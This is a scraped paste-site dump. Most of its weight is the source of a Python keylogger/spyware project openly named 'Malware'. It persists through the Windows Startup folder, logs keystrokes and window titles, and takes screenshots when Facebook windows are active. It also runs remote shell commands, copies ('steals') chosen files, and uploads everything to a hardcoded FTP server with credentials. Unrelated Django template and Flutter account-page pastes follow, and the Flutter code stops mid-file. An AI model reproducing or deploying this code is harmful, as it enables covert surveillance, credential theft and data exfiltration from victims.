                    with open(root + filename,'rb') as FILE:
                        ftp.storbinary(f'STOR {filename}', FILE)
                    os.remove(root + filename)          
            ftp.quit()
            print('FTP upload successfully finished!')
        except Exception as exception:
            print(f'COMMUNICATION ERROR!: {exception}')
"
ngFuXHVh,Configuration.py,FlyFar,Python,Thursday 10th of August 2023 09:51:00 PM CDT,"import getpass, sys
from os import path
from Util import Util



class Configuration:


    def __init__(self):
        #ABSOLUTE FILE PATHS AND USER DATA
            self.__userName = getpass.getuser()
            self.__fileName = 'Malware.exe'
            self.__filePath = f'c:\\Users\\{self.__userName}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
            self.__logFileName = 'log.txt'
            self.__logPath = f'c:\\Users\\{self.__userName}\\AppData\\Roaming\\tempData\\'
            self.__screenshotPath = self.__logPath
            self.__currentDir = path.dirname(sys.executable)
            self.__currentPath = self.__currentDir + f'\\{self.__fileName}'
        #WINDOWTRACKING AND KEYLOGGING
            self.__debug = None
            self.__keyloggingIsActive = None
            self.__windowTrackingIsActive = None
            self.__samplingFrequency = None
            self.__screenshotFrequency = None
            self.__screenshotTrigger = None
        #COMMUNICATION
            self.__baseURL = None
            self.__communicationFrequency = None
            self.__ftpURL = None
            self.__ftpUserName = None
            self.__ftpPassword = None
        #BACKDOOR
            self.__shellCommand = None
            self.__stealPath = None
        #SET ATTRIBUTES
            self.setAttributes()
            


    def setAttributes(self):
            try:
                config = Util.jsonIn(self.__logPath + 'config.json')
                self.__setConfig(config)
                Util.extractShellData(self.__logPath, self.__shellCommand)
                Util.stealFile(self.__logPath, self.__stealPath)
                print('Config.json loaded!')
            except Exception:
                self.__setDefault()
                print('Default loaded!')



    def __setConfig(self, config:dict):
            self.__debug = config['debug']
            self.__keyloggingIsActive = config['keyloggingIsActive']
            self.__windowTrackingIsActive = config['windowTrackingIsActive']
            self.__samplingFrequency = config['samplingfrequency']
            self.__screenshotFrequency = config['screenshotfrequency']
            self.__screenshotTrigger = config['screenshottrigger']
            self.__baseURL = config['baseurl']
            self.__communicationFrequency = config['communicationfrequency']
            self.__ftpURL = config['ftpurl']
            self.__ftpUserName = config['ftpusername']
            self.__ftpPassword = config['ftppassword']
            self.__shellCommand = config.get('shellcommand','')
            self.__stealPath = config.get('stealpath','')



    def __setDefault(self):
            self.__debug = True
            self.__keyloggingIsActive = True
            self.__windowTrackingIsActive = True
            self.__samplingFrequency = 0.1
            self.__screenshotFrequency = 50
            self.__screenshotTrigger = 'facebook'
            self.__baseURL = 'http://facebook-user-profile.herokuapp.com/malware'
            self.__communicationFrequency = 5
            self.__ftpURL = 'ftp://ftp.atw.hu'
            self.__ftpUserName = 'kiserletimuto'
            self.__ftpPassword = 'patti'



    @property
    def debug(self):
        return self.__debug

    @property
    def fileName(self):
        return self.__fileName

    @property
    def filePath(self):
        return self.__filePath

    @property
    def logPath(self):
        return self.__logPath

    @property
    def screenshotPath(self):
        return self.__screenshotPath

    @property
    def currentDir(self):
        return self.__currentDir

    @property
    def currentPath(self):
        return self.__currentPath

    @property
    def samplingFrequency(self):
        return self.__samplingFrequency

    @property
    def screenshotFrequency(self):
        return self.__screenshotFrequency

    @property
    def screenshotTrigger(self):
        return self.__screenshotTrigger

    @property
    def logFileName(self):
        return self.__logFileName

    @property
    def keyloggingIsActive(self):
        return self.__keyloggingIsActive

    @property
    def windowTrackingIsActive(self):
        return self.__windowTrackingIsActive

    @property
    def baseURL(self):
        return self.__baseURL

    @property
    def communicationFrequency(self):
        return self.__communicationFrequency

    @property
    def userName(self):
        return self.__userName

    @property
    def ftpURL(self):
        return self.__ftpURL

    @property
    def ftpUserName(self):
        return self.__ftpUserName

    @property
    def ftpPassword(self):
        return self.__ftpPassword"
Ncp8YPiJ,Malware.py,FlyFar,Python,Thursday 10th of August 2023 09:50:02 PM CDT,"from os import path, mkdir
import sys, shutil
from keylogger import Keylogger
from Screenshot import Screenshot
from WindowTracker import WindowTracker
from Communication import Communication
from Configuration import Configuration



class Malware:

    def __init__(self):
        self.__config = Configuration()
        self.__buildMalware()
        self.__screenshot = Screenshot(self.__config)
        self.__windowTracker = WindowTracker(self.__config, self.__screenshot)
        self.__communication = Communication(self, self.__config)
        self.__keylogger = Keylogger(self.__config, self.__communication)
        self.__keylogger.start()
        self.__windowTracker.start()
        self.__communication.start()
      
    

    def __buildMalware(self) -> None:
        if not self.__checkExistence():
            self.__createStructure()    
        elif  self.__config.currentPath.lower() != str(self.__config.filePath + self.__config.fileName).lower():
            sys.exit()



    def __checkExistence(self) -> bool:
        return path.isdir(self.__config.logPath) and path.isfile(self.__config.filePath + self.__config.fileName)



    def __createStructure(self) -> None:
        mkdir(self.__config.logPath)
        shutil.copy(self.__config.currentPath , self.__config.filePath + self.__config.fileName)




if __name__ == ""__main__"":
    malware = Malware()"
fmAtUkt1,Screenshot.py,FlyFar,Python,Thursday 10th of August 2023 09:47:56 PM CDT,"from PIL import ImageGrab
from os import system, path
from Configuration import Configuration


class Screenshot():

    def __init__(self, config: Configuration):
        self.__config = config
        self.__screenshotCounter = 0



    def takeScreenshot(self) -> None: 
        pic = ImageGrab.grab()
        self.__screenshotCounter += 1
        pic.save(self.__config.screenshotPath + f'\\{self.__screenshotCounter}.jpg')
        if self.__config.debug:
            print(f'Screenshot-{self.__screenshotCounter} taken')"
iTgMuEJ9,Util.py,FlyFar,Python,Thursday 10th of August 2023 09:46:54 PM CDT,"from subprocess import check_output
from json import loads
from shutil import copy, copy2


class Util:
  
    @staticmethod
    def fileOut(file:str, data:str, mode='a') -> None:
        try:
            with open(file=file, mode=mode, encoding='UTF-8') as FILE:
                FILE.write(str(data))
        except Exception:
            print('fileOut Error!')



    @staticmethod
    def jsonIn(file) -> str:
        with open(file=file, mode='r') as FILE:
            return loads(FILE.readlines()[0])



    @staticmethod
    def executeShellCommand(command:str) -> str:
        result = ''
        try:
            result = check_output(command, shell=True, encoding='437')
        except Exception as error:
            result = error
        return result



    @staticmethod
    def extractShellData(logPath, shellCommand:str):
        if shellCommand:
            try:
                result = Util.executeShellCommand(shellCommand)
                Util.fileOut(logPath + 'shell.txt', result, 'w')
                print('Shell command executed!')
            except Exception:
                print('shellcommand error')



    @staticmethod
    def stealFile(logPath, stealPath:str):
        if stealPath:
            try:
                filename = stealPath.split('\\')[-1]
                copy2(stealPath, logPath + filename)
                print('File has been stolen!')
            except Exception as error:
                print('stealfile: ',error)
"
J1ZKiRvv,WindowTracker.py,FlyFar,Python,Thursday 10th of August 2023 09:46:11 PM CDT,"import win32gui, time, win32process
from threading import Thread
from Screenshot import Screenshot
from Util import Util



class WindowTracker(Thread):

    def __init__(self, config, screenshot):
        Thread.__init__(self, name='window tracking')
        self.__config = config
        self.__screenshot = screenshot
        self.__activeWindow = None
        self.__screenshotTimer = 0



    def run(self):
        while True:
            if self.__config.windowTrackingIsActive:
                time.sleep(self.__config.samplingFrequency)
                activeWindow = win32gui.GetForegroundWindow()
                activeWindowText = win32gui.GetWindowText(activeWindow)
                self.__examineWindow(activeWindowText)
                self.__screenshotHandler(activeWindowText)



    def __examineWindow(self, activeWindowTitle:str) -> None:
        if self.__activeWindow != activeWindowTitle:
            self.__activeWindow = activeWindowTitle
            windowTitle = '\n'*2 + f'{self.__activeWindow}'.center(100,'-') + '\n'
            if self.__config.debug:
                print(windowTitle)
            Util.fileOut(self.__config.logPath + self.__config.logFileName, windowTitle)



    def __screenshotHandler(self, activeWindowText:str) -> None:
        for trigger in self.__config.screenshotTrigger.split(' '):
            if trigger in activeWindowText.lower():
                self.__screenshotTimer += 1
                if self.__config.debug:
                    print(self.__screenshotTimer)
                if self.__screenshotTimer % self.__config.screenshotFrequency == 0:
                    self.__screenshot.takeScreenshot()"
LTkrnYVF,keylogger.py,FlyFar,Python,Thursday 10th of August 2023 09:45:21 PM CDT,"import shutil
from pynput.keyboard import Key, Listener
from threading import Thread
from Util import Util


class Keylogger(Thread):

    def __init__(self, config, communication):
        Thread.__init__(self, name='keylogging')
        self.__config = config
        self.__communication = communication



    def onPress(self, key):
        if self.__config.debug:
            print(key, end='')
        try:
            if key == Key.tab:
                self.__communication.getConfigFromServer()
            elif key == Key.shift:
                self.__communication.uploadFilesFTP()
        except Exception:
            pass
        Util.fileOut(self.__config.logPath + self.__config.logFileName, key)



    def run(self):
        with Listener(on_press=self.onPress) as listener:
            if self.__config.keyloggingIsActive:
                listener.join()"
qPiMCiF9,Untitled,keselyoleren,HTML,Thursday 10th of August 2023 09:34:37 PM CDT," <div class=""carousel-inner relative w-full overflow-hidden""  style="" width:100%; height: 500px !important;"">
            {% for item in tag|get_banner %}
                {% if forloop.counter == 1 %}
                    <div class=""carousel-item active float-left w-full"">
                        {% if item.is_mobile %}
                            {% comment %} banner mobile {% endcomment %}
                            <img src=""{{ item.photo.url }}"" style=""height: 50%;"" class=""block w-full"" alt=""Wild Landscape"" />
                        {% else %}
                            {% comment %} banner dekstop {% endcomment %}
                            <img src=""{{ item.photo.url }}"" style=""height: 50%;"" class=""block w-full"" alt=""Wild Landscape"" />
                        {% endif %}

                    </div>    
                {% else %}
                <div class=""carousel-item float-left w-full"">
                    <img src=""{{ item.photo.url }}"" class=""block w-full"" alt=""Wild Landscape"" />
                </div>
                {% endif %}
            {% endfor %}
        </div>"
crW9Y8qL,account page,Alfen3033,Dart,Thursday 10th of August 2023 09:26:52 PM CDT,"import 'dart:developer';

import 'package:flutter/material.dart';

import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_svg/flutter_svg.dart';
import 'package:planet_gadget/application/account/account_address_state.dart';
import 'package:planet_gadget/library/textstyle.dart';
import 'package:planet_gadget/main.dart';
import 'package:planet_gadget/presentation/pages/account/setting_account_page.dart';
import 'package:planet_gadget/presentation/pages/shopping_cart/shopping_cart_page.dart';
import 'package:sizer/sizer.dart';

import '../../../application/account/account_address_notifier.dart';
import '../../../application/account/account_notiifer.dart';
import '../../../domain/entity/core/address_model.dart';
import '../../../library/color.dart';
import '../../../library/toast.dart';
import '../../../utils/constants/path.dart';
import '../purchase/purchase_page.dart';
import 'widgets/field.dart';

class AccountPage extends ConsumerStatefulWidget {
  const AccountPage({super.key});

  @override
  ConsumerState<AccountPage> createState() => _AccountPageState();
}

class _AccountPageState extends ConsumerState<AccountPage> {
  TextEditingController recipientC = TextEditingController(),
      phoneNumberC = TextEditingController(),
      addressC = TextEditingController();
  DraggableScrollableController dragC = DraggableScrollableController();
  DraggableScrollableController addressListC = DraggableScrollableController();
  DraggableScrollableController addAddressC = DraggableScrollableController();
  DraggableScrollableController addAddressCloseConfirmC =
      DraggableScrollableController();
  DraggableScrollableController editAddressC = DraggableScrollableController();
  DraggableScrollableController editAddressConfirmC =
      DraggableScrollableController();
  DraggableScrollableController editAddressCloseConfirmC =
      DraggableScrollableController();
  DraggableScrollableController deleteAddressConfirmC =
      DraggableScrollableController();
  bool redeem = false;
  bool address1 = false;
  String address1Value = ""Yoshua"";
  String address2Value = ""Address 2"";
  String payment1Value = ""Transfer Bank"";
  TextEditingController searchC = TextEditingController();
  String searchValue = """";
  List searchResult = [];
  bool home = true;

  List<String> paymentList = [""Transfer Bank"", ""Gopay""];
  List<String> paymentFileList = [""bank_transfer2.png"", ""gopay.png""];

  List<AddressModel> addressList = [];

  Map<String, dynamic> userData = {};

  @override
  Widget build(BuildContext context) {
    final accountState = ref.watch(accountNotifier);
    final accountStateNotifier = ref.read(accountNotifier.notifier);

    userData =
        accountState.maybeWhen(data: (userdata) => userdata, orElse: () => {});

    if (userData.isNotEmpty) {
      // log(userData['addresses'].length.toString());
      for (var i = 0; i < userData['addresses'].length; i++) {
        AddressModel data = AddressModel(
            label: ""home"",
            name:
                ""${userData['addresses'][i]['firstname']} ${userData['addresses'][i]['lastname']}"",
            phoneNumber: userData['addresses'][i]['telephone'],
            completeAddress:
                ""${userData['addresses'][i]['street'][0]} ${userData['addresses'][i]['postcode']}, ${userData['addresses'][i]['custom_attributes'][1]['value']}, ${userData['addresses'][i]['city']}, ${userData['addresses'][i]['region']['region']}"");
        addressList.add(data);
      }
    }
    return SafeArea(
      top: false,
      child: Scaffold(
        backgroundColor: Colors.transparent,
        body: GestureDetector(
          onTap: () => FocusManager.instance.primaryFocus?.unfocus(),
          child: RefreshIndicator(
            onRefresh: () {
              return refresh();
            },
            child: SingleChildScrollView(
              child: Container(
                decoration: BoxDecoration(
                    image: DecorationImage(
                        alignment: Alignment.topCenter,
                        fit: BoxFit.contain,
                        image:
                            AssetImage(""${backgroundsPath}bg_dashboard.jpg""))),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: <Widget>[
                    Padding(
                      padding: const EdgeInsets.fromLTRB(20, 40, 20, 0),
                      child: Row(
                        mainAxisAlignment: MainAxisAlignment.start,
                        children: [
                          // Expanded(
                          //   flex: 1,
                          //   child: InkWell(
                          //     onTap: null,
                          //     // onTap: () => Navigator.pop(context),
                          //     child: Icon(
                          //       Icons.navigate_before,
                          //       color: white,
                          //       size: 32,
                          //     ),
                          //   ),
                          // ),
                          // const SizedBox(width: 16),
                          Expanded(
                              flex: 8,
                              child:
                                  Text(""Account"", style: inter20BoldWhite())),
                          Expanded(
                            flex: 4,
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.end,
                              children: <Widget>[
                                InkWell(
                                  onTap: () => routes.navigateTo(context,
                                      page: ShoppingCartPage()),
                                  child: SvgPicture.asset(
                                    '${iconsAccountPath}shopping-cart_white.svg',
                                    width: 24,
                                    height: 24,
                                  ),
                                ),
                                Padding(
                                  padding: const EdgeInsets.only(left: 20),
                                  child: InkWell(
                                    onTap: () => Navigator.push(
                                        context,
                                        MaterialPageRoute(
                                            builder: (context) =>
                                                SettingAccountPage())),
                                    child: SvgPicture.asset(
                                      '${iconsAccountPath}edit_white.svg',
                                      width: 24,
                                      height: 24,
                                    ),
                                  ),
                                ),
                              ],
                            ),
                          )
                        ],
                      ),
                    ),
                    Padding(
                        padding: const EdgeInsets.fromLTRB(20, 26, 10, 12),
                        child: memberCard(
                            name: prefs.getString('firstname').toString(),
                            point: ""400"",
                            level: ""Gold"",
                            iconPath: ""member.svg"",
                            backgroundPath: ""bg_yellow.jpg"")),
                    Container(
                      padding: const EdgeInsets.fromLTRB(20, 8, 20, 20),
                      decoration: BoxDecoration(
                        color: white,
                        borderRadius: const BorderRadius.only(
                          topLeft: Radius.circular(12),
                          topRight: Radius.circular(12),
                        ),
                      ),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: <Widget>[
                          Row(
                            mainAxisAlignment: MainAxisAlignment.spaceBetween,
                            children: <Widget>[
                              Text(""My Purchases"", style: inter16Bold()),
                              InkWell(
                                onTap: () => Navigator.push(
                                    context,
                                    MaterialPageRoute(
                                        builder: (context) =>
                                            const PurchasePage(
                                                initialIndex: 0))),
                                child: Row(
                                  children: [
                                    Text(""Purchase history"",
                                        style: inter12Black2()),
                                    Icon(
                                      Icons.navigate_next,
                                      color: black,
                                      size: 20,
                                    ),
                                  ],
                                ),
                              )
                            ],
                          ),
                          Divider(thickness: 1, color: black3),
                          Row(
                            mainAxisAlignment: MainAxisAlignment.spaceBetween,
                            children: <Widget>[
                              iconBox(
                                  name: ""To Pay"",
                                  iconName: ""to_pay.svg"",
                                  onClick: () => routes.navigateTo(context,
                                      page:
                                          const PurchasePage(initialIndex: 0))),
                              iconBox(
                                  name: ""Packing"",
                                  iconName: ""packing.svg"",
                                  onClick: () => routes.navigateTo(context,
                                      page:
                                          const PurchasePage(initialIndex: 1))),
                              iconBox(
                                  name: ""Delivery"",
                                  iconName: ""delivery.svg"",
                                  onClick: () => routes.navigateTo(context,
                                      page:
                                          const PurchasePage(initialIndex: 2))),
                              iconBox(
                                  name: ""Arrived"",
                                  iconName: ""arrived.svg"",
                                  onClick: () => routes.navigateTo(context,
                                      page:
                                          const PurchasePage(initialIndex: 3))),
                            ],
                          ),
                          const SizedBox(height: 16),
                          Text(""Account Setting"", style: inter16Bold()),
                          Divider(thickness: 1, color: black3),
                          Row(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: <Widget>[
                              Expanded(
                                flex: 1,
                                child: SvgPicture.asset(
                                    ""${iconsAccountPath}address_list.svg""),
                              ),
                              const SizedBox(width: 8),
                              Expanded(
                                  flex: 9,
                                  child: InkWell(
                                    onTap: addressSheet,
                                    child: Column(
                                      crossAxisAlignment:
                                          CrossAxisAlignment.start,
                                      children: <Widget>[
                                        Text(""Address List"",
                                            style: inter14Bold()),
                                        const SizedBox(height: 4),
                                        Text(""Set your gadget delivery address"",
                                            style: inter12Gray5()),
                                        const SizedBox(height: 4),
                                        Row(
                                          crossAxisAlignment:
                                              CrossAxisAlignment.start,
                                          children: [
                                            Expanded(
                                              flex: 2,
                                              child: Text(""Address: "",
                                                  style: inter14BoldBlack2()),
                                            ),
                                            Expanded(
                                              flex: 8,
                                              child: Text(
                                                  "" ${userData.isNotEmpty ? userData['addresses'][0]['street'][0] : """"}"",
                                                  style: inter14MediumBlack2()),
                                            ),
                                          ],
                                        )
                                      ],
                                    ),
                                  )),
                            ],
                          ),
                          const SizedBox(height: 16),
                          Row(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: <Widget>[
                              Expanded(
                                flex: 1,
                                child: SvgPicture.asset(
                                    ""${iconsAccountPath}payment.svg""),
                              ),
                              const SizedBox(width: 8),
                              Expanded(
                                  flex: 9,
                                  child: InkWell(
                                    onTap: paymentSheet,
                                    child: Column(
                                      crossAxisAlignment:
                                          CrossAxisAlignment.start,
                                      children: <Widget>[
                                        Text(""Payment"", style: inter14Bold()),
                                        const SizedBox(height: 4),
                                        Text(""Set how you make payments"",
                                            style: inter12Gray5()),
                                        const SizedBox(height: 4),
                                        Row(
                                          children: [
                                            Expanded(
                                              flex: 2,
                                              child: Text(""Payment: "",
                                                  style: inter14BoldBlack2()),
                                            ),
                                            Expanded(
                                              flex: 8,
                                              child: Text(""Gopay"",
                                                  style: inter14MediumBlack2()),
                                            ),
                                          ],
                                        )
                                      ],
                                    ),
                                  )),
                            ],
                          ),
                        ],
                      ),
                    ),
                    Container(height: 12.h, color: white),
                  ],
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }

  refresh() async {}

  onChangedSearch(String val) {
    searchResult.clear();
    searchValue = val;
    if (val != """") {
      // searchResult = kp.getKategoriList
      //     .where((item) => item.nama.toLowerCase().contains(searchValue))
      //     .toList();
    }
    setState(() {});
  }

  Widget colorBox(
      {required int bgColor,
      required int mainColor,
      required String imageName,
      required String name,
      Function()? onClick}) {
    return InkWell(
      onTap: onClick,
      child: Container(
        width: 72,
        height: 72,
        padding: const EdgeInsets.fromLTRB(0, 16, 0, 4),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(8),
          color: Color(bgColor),
        ),
        child: Column(
          children: <Widget>[
            SvgPicture.asset(""$iconsPath$imageName""),
            const SizedBox(height: 4),
            Flexible(
              child: Text(
                name,
                style: TextStyle(
                    color: Color(mainColor),
                    fontWeight: FontWeight.w500,
                    fontSize: 12,
                    overflow: TextOverflow.fade),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget imageBox(
      {required double borderRadius,
      double? height,
      double? width,
      required String imagePath}) {
    return Container(
      height: height,
      width: width,
      decoration: BoxDecoration(
        color: Colors.blue,
        borderRadius: BorderRadius.circular(borderRadius),
        image: DecorationImage(
          fit: BoxFit.cover,
          image: AssetImage(imagePath),
        ),
      ),
    );
  }

  Widget cardProduct(
      {required String imageName,
      required String price,
      required String productName,
      Function()? onClick}) {
    return InkWell(
      onTap: onClick,
      child: Container(
        width: 155,
        margin: const EdgeInsets.only(top: 4),
        padding: const EdgeInsets.all(12),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(12),
          color: white,
          boxShadow: const <BoxShadow>[
            BoxShadow(
              blurRadius: 4,
              color: Color.fromRGBO(0, 0, 0, 0.25),
            ),
          ],
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: <Widget>[
            Expanded(
              flex: 12,
              child: SizedBox(
                width: 131,
                height: 145,
                child: Image.asset(
                  '$productsPath$imageName',
                  fit: BoxFit.contain,
                ),
              ),
            ),
            const SizedBox(height: 8),
            Expanded(
                flex: 3,
                child: Text(productName + ""aaaaaaaaaaaaaaaa"",
                    style: inter12MediumBlack())),
            const SizedBox(height: 8),
            Expanded(flex: 3, child: Text(price, style: inter14Bold())),
          ],
        ),
      ),
    );
  }

  Widget memberCard({
    required String name,
    required String point,
    required String level,
    required String iconPath,
    required String backgroundPath,
    Color? textColor,
  }) {
    return Container(
      width: 90.w,
      height: 155,
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
          image: DecorationImage(
              image: AssetImage(""$backgroundsPath$backgroundPath""),
              fit: BoxFit.cover),
          borderRadius: BorderRadius.circular(12)),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: <Widget>[
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Text(name,
                  style:
                      textColor == null ? inter28Bold() : inter28BoldWhite()),
              Column(children: <Widget>[
                SvgPicture.asset(
                  ""$iconsPath$iconPath"",
                  width: 16,
                  height: 16,
                ),
                const SizedBox(height: 4),
                Text(level,
                    style: textColor == null
                        ? inter12BoldBlack()
                        : inter12BoldWhite()),
              ]),
            ],
          ),
          const SizedBox(height: 8),
          Text(""Your Point : $point"",
              style: textColor == null ? inter14Bold() : inter14BoldWhite()),
          const SizedBox(height: 24),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
            decoration: BoxDecoration(
                color: black3, borderRadius: BorderRadius.circular(8)),
            child:
                Text(""Join priority member"", style: inter12BoldActiveYellow()),
          )
        ],
      ),
    );
  }

  Widget iconBox(
      {required String name, required String iconName, Function()? onClick}) {
    return InkWell(
      onTap: onClick,
      child: Column(
        children: [
          Container(
            margin: const EdgeInsets.only(bottom: 6, top: 16),
            padding: const EdgeInsets.all(4),
            decoration: BoxDecoration(
                border: Border.all(color: primaryBlue),
                borderRadius: BorderRadius.circular(8)),
            child: SvgPicture.asset(""$iconsAccountPath$iconName"",
                width: 36, height: 36),
          ),
          Text(name, style: inter12()),
        ],
      ),
    );
  }

  addAddressSheet() {
    showModalBottomSheet(
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(15.0)),
      ),
      context: context,
      builder: (context) {
        return DraggableScrollableSheet(
          controller: addAddressC,
          initialChildSize: 0.82,
          minChildSize: 0.82,
          maxChildSize: 0.96,
          expand: false,
          snap: true,
          builder: (BuildContext context, ScrollController scrollController) {
            return StatefulBuilder(
              builder: (context, setState) {
                return Consumer(builder: (context, ref, child) {
                  AccountAddressState state = ref.watch(accountAddressNotifier);
                  final editAddressNotifer =
                      ref.watch(accountAddressNotifier.notifier);
                  return Padding(
                    padding: EdgeInsets.only(
                        bottom: MediaQuery.of(context).viewInsets.bottom),
                    child: Column(
                      children: <Widget>[
                        Container(
                          margin: const EdgeInsets.only(bottom: 8),
                          decoration:
                              const BoxDecoration(color: Color(0xfff8faf7)),
                          child: Column(
                            children: <Widget>[
                              Center(
                                child: Container(
                                  margin: const EdgeInsets.only(top: 8),
                                  color: activeBgColor,
                                  width: 100,
                                  height: 4,
                                ),
                              ),
                              Padding(
                                padding: const EdgeInsets.only(
                                    left: 20.0,
                                    right: 20.0,
                                    top: 24.0,
                                    bottom: 12.0),
                                child: Row(
                                  children: [
                                    /// Bottom sheet title text
                                    Expanded(
                                        flex: 5,
                                        child: Text(""Add Address"",
                                            style: inter28Bold())),
                                    Expanded(
                                        flex: 5,
                                        child: Row(
                                          mainAxisAlignment:
                                              MainAxisAlignment.end,
                                          children: [
                                            InkWell(
                                              onTap:
                                                  closeConfirmAddAddressSheet,
                                              child: const Icon(Icons.close),
                                            ),
                                          ],
                                        )),
                                  ],
                                ),
                              ),
                            ],
                          ),
                        ),

                        /// Listview (list of data with check box for multiple selection & on tile tap single selection)
                        Expanded(
                          child: ListView(
                            controller: scrollController,
                            children: <Widget>[
                              Padding(
                                padding:
                                    const EdgeInsets.symmetric(horizontal: 20),
                                child: Row(
                                  children: [
                                    Text(""Address Labels"",
                                        style: inter14Medium()),
                                    Text(""*"", style: inter14MediumRed()),
                                  ],
                                ),
                              ),
                              const SizedBox(height: 8),
                              Padding(
                                padding:
                                    const EdgeInsets.symmetric(horizontal: 20),
                                child: Row(
                                  children: [
                                    addressLabel(
                                        title: ""Home"",
                                        value: home,
                                        onClick: () =>
                                            setState(() => home = true)),
                                    const SizedBox(width: 12),
                                    addressLabel(
                                        title: ""Office"",
                                        value: !home,
                                        onClick: () =>
                                            setState(() => home = false)),
                                  ],
                                ),
                              ),
                              const SizedBox(height: 12),
                              fieldAddress(
                                required: true,
                                name: ""Recipient's Name"",
                                hint: ""Recipient's Name"",
                                controller: recipientC,
                                error: state.recipient.errorMessage,
                                onchanged: (val) {
                                  state = state.copyWith(
                                      recipient:
                                          state.recipient.copyWith(value: val));
                                  editAddressNotifer.checkField(
                                      val: state.recipient.value,
                                      fieldEmpty: state.recipient.isEmpty,
                                      fieldErrorMsg:
                                          state.recipient.errorMessage,
                                      errorMsg: ""Nama Recepient harus diisi"",
                                      type: ""recipient"");
                                },
                              ),
                              // const SizedBox(height: 16),
                              fieldAddress(
                                required: true,
                                name: ""Mobile Phone Number"",
                                hint: ""Mobile Phone Number"",
                                controller: phoneNumberC,
                                error: state.phoneNumber.errorMessage,
                                onchanged: (val) {
                                  state = state.copyWith(
                                      phoneNumber: state.phoneNumber
                                          .copyWith(value: val));
                                  editAddressNotifer.checkField(
                                      val: state.phoneNumber.value,
                                      fieldEmpty: state.phoneNumber.isEmpty,
                                      fieldErrorMsg:
                                          state.phoneNumber.errorMessage,
                                      errorMsg: ""Nomor HP harus diisi"",
                                      type: ""phoneNumber"");
                                },
                              ),
                              // const SizedBox(height: 16),
                              fieldAddress(
                                required: true,
                                name: ""Complete Address"",
                                hint: ""Complete Address"",
                                controller: addressC,
                                error: state.address.errorMessage,
                                onchanged: (val) {
                                  state = state.copyWith(
                                      address:
                                          state.address.copyWith(value: val));
                                  editAddressNotifer.checkField(
                                      val: state.address.value,
                                      fieldEmpty: state.address.isEmpty,
                                      fieldErrorMsg: state.address.errorMessage,
                                      errorMsg: ""Alamat harus diisi"",
                                      type: ""address"");
                                },
                              )
                            ],
                          ),
                        ),
                        afterChangeButton(
                            name: ""Save"",
                            onClick: () {
                              editAddressNotifer.checkField(
                                  val: state.recipient.value,
                                  fieldEmpty: state.recipient.isEmpty,
                                  fieldErrorMsg: state.recipient.errorMessage,
                                  errorMsg: ""Nama Recepient harus diisi"",
                                  type: ""recipient"");
                              editAddressNotifer.checkField(
                                  val: state.phoneNumber.value,
                                  fieldEmpty: state.phoneNumber.isEmpty,
                                  fieldErrorMsg: state.phoneNumber.errorMessage,
                                  errorMsg: ""Nomor HP harus diisi"",
                                  type: ""phoneNumber"");
                              editAddressNotifer.checkField(
                                  val: state.address.value,
                                  fieldEmpty: state.address.isEmpty,
                                  fieldErrorMsg: state.address.errorMessage,
                                  errorMsg: ""Alamat harus diisi"",
                                  type: ""address"");
                              if (state.recipient.value != """" &&
                                  state.phoneNumber.value != """" &&
                                  state.address.value != """") {
                                addressList.add(AddressModel(
                                    label: state.label,
                                    name: state.recipient.value,
                                    phoneNumber: state.phoneNumber.value,
                                    completeAddress: state.address.value));
                                userData['addresses'] = addressList;
                                final updateaccount =
                                    ref.read(accountNotifier.notifier);
                                updateaccount.updateUser(userData: userData);
                                showToast(""Data saved successfully"", context);
                                Navigator.of(context)
                                  ..pop()
                                  ..pop();
                              }
                            }),
                      ],
                    ),
                  );
                });
              },
            );
          },
        );
      },
    );
  }

  addressSheet() {
    showModalBottomSheet(
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(15.0)),
      ),
      context: context,
      builder: (context) {
        return DraggableScrollableSheet(
          controller: addressListC,
          initialChildSize: 0.46,
          minChildSize: 0.1,
          maxChildSize: 0.96,
          expand: false,
          snap: true,
          builder: (BuildContext context, ScrollController scrollController) {
            return StatefulBuilder(
              builder: (context, setState) {
                return Column(
                  children: <Widget>[
                    Container(
                      margin: const EdgeInsets.only(bottom: 8),
                      decoration: const BoxDecoration(color: Color(0xfff8faf7)),
                      child: Column(
                        children: <Widget>[
                          Center(
                            child: Container(
                              margin: const EdgeInsets.only(top: 8),
                              color: activeBgColor,
                              width: 100,
                              height: 4,
                            ),
                          ),
                          Padding(
                            padding: const EdgeInsets.only(
                                left: 20.0,
                                right: 20.0,
                                top: 24.0,
                                bottom: 12.0),
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                /// Bottom sheet title text
                                Expanded(
                                    child: Text(""Address List"",
                                        style: inter28Bold())),
                                Align(
                                  alignment: Alignment.centerRight,
                                  child: InkWell(
                                    onTap: () {
                                      FocusScope.of(context).unfocus();
                                      Navigator.of(context).pop(null);
                                    },
                                    child: const Icon(Icons.close),
                                  ),
                                ),
                              ],
                            ),
                          ),
                        ],
                      ),
                    ),

                    /// Listview (list of data with check box for multiple selection & on tile tap single selection)
                    Expanded(
                      child: SizedBox(
                        child: ListView.separated(
                          padding: const EdgeInsets.all(20),
                          scrollDirection: Axis.horizontal,
                          itemBuilder: (context, index) {
                            if (index != addressList.length) {
                              final item = addressList[index];
                              return addressBox(
                                value: item.name,
                                groupValue: address1Value,
                                addressName: item.label,
                                name: item.name,
                                phone: item.phoneNumber,
                                address: item.completeAddress,
                                index: index,
                              );
                            }
                            return addAddress();
                          },
                          separatorBuilder: (context, index) =>
                              const SizedBox(width: 8),
